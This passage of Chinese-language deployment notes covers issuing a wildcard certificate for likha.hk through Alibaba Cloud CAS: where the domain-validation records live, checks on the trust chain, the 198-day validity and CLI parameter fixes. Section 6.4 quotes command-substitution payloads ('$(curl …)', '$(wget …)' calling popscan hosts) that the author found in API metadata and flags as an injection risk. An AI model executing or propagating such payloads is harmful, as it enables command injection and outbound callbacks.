## 3. ★ 关键发现：V2 实例的 DCV 通道（此前未知）

**问题**：CAS V2.0「订阅实例」目录（`ListInstances`/`UpdateInstance`/`ApplyCertificate`/…）**没有任何域名验证接口**；V1 的 `DescribeCertificateState` 需要 `OrderId`，而 `ListUserCertificateOrder` 对本账号**恒返回 0 条**（BUY/CPACK/CERT/UPLOAD 全试过）。

**答案**：DCV 记录在 **`GetInstanceDetail` 的 `DomainValidationList` 字段**里 —— 该字段**不在 CLI 文本帮助中**，是通过 OpenAPI 元数据（`api.aliyun.com/meta/v1/.../api-docs`）比对响应 schema 才发现的。`ApplyCertificate` 后约 4 分钟字段才填充。

```
DomainValidationList[] = {
  Domain, RootDomain,
  ValidationKey,     # 主机记录，如 _dnsauth
  ValidationType,    # TXT / CNAME
  ValidationValue,   # 记录值
  Cname, CnameKey    # CNAME 方式时使用
}
```

**取证命令**：
```bash
aliyun cas GetInstanceDetail --region ap-southeast-1 --InstanceId <IID> \
  --cli-query 'DomainValidationList'
```

## 4. 证书核验（G5 验收证据）

```
subject=CN = *.likha.hk
issuer=C = CN, O = "Aliyun Computing Co, Ltd.", CN = Aliyun RSA TLS DV G1
notBefore=Oct 12 00:00:00 2026 GMT
notAfter=Apr 28 23:59:59 2027 GMT
X509v3 Subject Alternative Name:
    DNS:*.likha.hk, DNS:likha.hk
CA Issuers: http://cacerts.digicert.cn/AliyunRSATLSDVG1.crt
→ openssl verify -untrusted <intermediate> leaf.pem  =>  OK
```

**信任链结论**：品牌虽显示 `Alibaba`，但链路是 **DigiCert 签发**（OCSP/CA Issuers 均在 `digicert.cn`），根为 **DigiCert Global Root G2** ⇒ 全浏览器/系统信任，**无兼容性风险**。此前在 DV(300/207) 与 RapidSSL(300) 之间权衡的"信任度"顾虑，实测不存在。

`ListCertificates` 同时给出：`CertificateName=cert-mm96r`、`FingerPrint=7494592843BFB96287D26D730838E0E7162E42B3`、`KeySize=2048`。

## 6. 附带的认知纠正（4 条）

### 6.1 `.hk` 完全可以用 DV（此前疑问）
控制台提示「DV 证书无法为特殊域名签发（.edu/.gov/.org/.jp 等）」列的是**枚举清单**，不是"所有国家缩写后缀"。四源交叉核验（阿里云国际站/中国站/腾讯云/CA 制裁黑名单）**均不含 `.hk`**。受限的真实成因是**注册局身份门槛**（`.jp` 需日本关联）、**国际制裁**（`.ru`/`.ir`/`.kp`）、**高危词**（`.pay`/`.bank`），`.hk`（HKDNR 全球开放注册）三条都不命中。**GlobalSign 品牌无任何后缀限制。**

### 6.2 ⚠️ 证书有效期只有 198 天，不是 1 年
订阅期 1 年（`OrderEndTime` 2027-10-12），但**单张证书有效期 2026-10-12 → 2027-04-28（198 天）** —— CA/B Forum 新规上限约 200 天。且本实例 **`AutoReissue=disable`（未开自动托管）**。
⇒ **必须建立续签动作：最迟 2027-03-中旬**（到期前 30–45 天）。若需平台自动续期，需开启自动托管（消耗托管额度）。

### 6.3 `CreateInstance` 的周期参数口径
`--PricingCycle 1`（年）报 `MissingParameter: pricingCycle error`；**正确为 `--PricingCycle 2`（月）+ `--Period 12`（12 个月 = 1 年）**。失败尝试零成本（不产生订单）。

### 6.4 ⚠️ OpenAPI 元数据中发现命令注入痕迹（安全提示）
拉取 `api.aliyun.com/meta/v1/products/cas/.../apis/ListInstances/api` 时，其 `enum` 取值里混入了 `$(curl gFG8PcsM.popscan.xaliyun.com)`、`$(wget DqKHrfxD.popscan.xaliyun.com)` 之类的**命令替换载荷**。**任何解析该元数据的工具都不得执行 enum 值**。本次仅读取未执行。取证：`deploy/logs/certC_12_probe.sh` 输出。
